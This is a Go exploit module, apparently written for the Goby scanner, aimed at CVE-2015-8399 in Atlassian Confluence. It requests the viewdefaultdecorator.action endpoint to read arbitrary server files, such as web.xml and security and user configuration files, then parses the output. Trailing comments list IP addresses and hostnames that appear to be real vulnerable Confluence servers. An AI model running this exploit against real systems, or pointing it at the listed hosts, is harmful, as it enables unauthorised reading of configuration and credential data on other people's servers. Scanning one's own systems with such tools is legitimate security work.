package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Confluence Viewdecorator.action File Read (CVE-2015-8399)",
    "Description": "CVE-2015-8399, there is an arbitrary file enumeration read vulnerability in Atlassian Confluence versions before 5.8.17. Attackers can use this vulnerability to enumerate and read files on the server.",
    "Product": "Confluence",
    "Homepage": "http://www.atlassian.com/",
    "DisclosureDate": "2021-06-09",
    "Author": "atdpa4sw0rd@gmail.com",
    "GobyQuery": "app=\"Confluence\"",
    "Level": "3",
    "Impact": "<p>Leaking the source code, database configuration files, etc., caused the website to be extremely insecure.</p>",
    "Recommendation": "<p>1. Limited catalog</p><p>2. The whitelist limits the readable path</p>",
    "References": [
        "http://www.securityfocus.com/archive/1/537232/100/0/threaded",
        "https://www.exploit-db.com/exploits/39170/",
        "https://nvd.nist.gov/vuln/detail/CVE-2015-8399",
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-8399"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "FileName",
            "type": "createSelect",
            "value": "/WEB-INF/web.xml,/WEB-INF/decorators.xml,/WEB-INF/glue-config.xml,/WEB-INF/server-config.wsdd,/WEB-INF/sitemesh.xml,/WEB-INF/urlrewrite.xml,/databaseSubsystemContext.xml,/securityContext.xml,/services/statusServiceContext.xml,/com/atlassian/confluence/security/SpacePermission.hbm.xml,/com/atlassian/confluence/user/OSUUser.hbm.xml,/com/atlassian/confluence/security/ContentPermissionSet.hbm.xml,/com/atlassian/confluence/user/ConfluenceUser.hbm.xml",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "File Inclusion"
    ],
    "CVEIDs": [
        "CVE-2015-8399"
    ],
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10206"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			cfgGet := httpclient.NewGetRequestConfig("/spaces/viewdefaultdecorator.action?decoratorName=/")
			cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGet.VerifyTls = false
			resp, err := httpclient.DoHttpRequest(u, cfgGet)
			if err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "<code>") && strings.Contains(resp.Utf8Html, "log4j.properties<br")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["FileName"].(string)
			cfgGet := httpclient.NewGetRequestConfig(fmt.Sprintf("/spaces/viewdefaultdecorator.action?decoratorName=%s", cmd))
			cfgGet.Header.Store("Content-Type", "application/x-www-form-urlencoded")
			cfgGet.VerifyTls = false
			resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfgGet)
			if err == nil {
				expResult.Success = true
				// expResult.OutputType = "html"
				resinfo := regexp.MustCompile(`(?s)<code>(.*?)</code>`).FindStringSubmatch(resp.RawBody)[1]
				resinfo = strings.Replace(resinfo, "<br/>", "", -1)
				resinfo = strings.Replace(resinfo, "&nbsp;", " ", -1)
				resinfo = strings.Replace(resinfo, "&lt;", "<", -1)
				resinfo = strings.Replace(resinfo, "&gt;", ">", -1)
				resinfo = strings.Replace(resinfo, "&gt;", ">", -1)
				resinfo = strings.Replace(resinfo, "&quot;", "\"", -1)

				expResult.Output = resinfo
			}
			return expResult
		},
	))
}

// 123.57.255.37:8090
// https://wiki.transvar.org
// 113.108.195.242:8091
// 113.108.195.242:8091
// 106.15.72.205:8090
// wiki.flipscript.com.cn
// 106.15.72.205:8090
// www.tenwebchat.com:8880
// 106.52.59.48:8880
// 106.52.59.48:8880
// 59.124.115.45:8090
// developer.embedian.com
// 59.124.115.45:8090
